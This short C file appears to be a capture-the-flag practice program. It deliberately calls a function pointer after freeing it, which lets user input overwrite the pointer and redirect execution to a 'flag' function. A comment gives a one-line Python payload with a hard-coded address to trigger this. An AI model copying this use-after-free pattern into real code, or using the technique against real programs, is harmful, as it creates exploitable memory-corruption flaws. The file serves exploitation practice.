#include <stdio.h>
#include <stdlib.h>

void w(void)
{
    puts("flag");
}

void hello(void) { 
    puts("hello"); 
}

typedef void (*func_ptr)(void);

// python3 -c "import sys; sys.stdout.buffer.write(b'\x75\x14\x40\x00\x00\x00\x00\x00')" | .\test.exe
int main(void) 
{
    func_ptr *fp = malloc(sizeof(func_ptr));
    *fp = hello;
    (*fp)();
    free(fp);
    char *b = malloc(sizeof(func_ptr));
    printf("give me something: ");
    fgets(b, sizeof(func_ptr), stdin);
    puts("thank you");
    (*fp)();
    return 0;
}
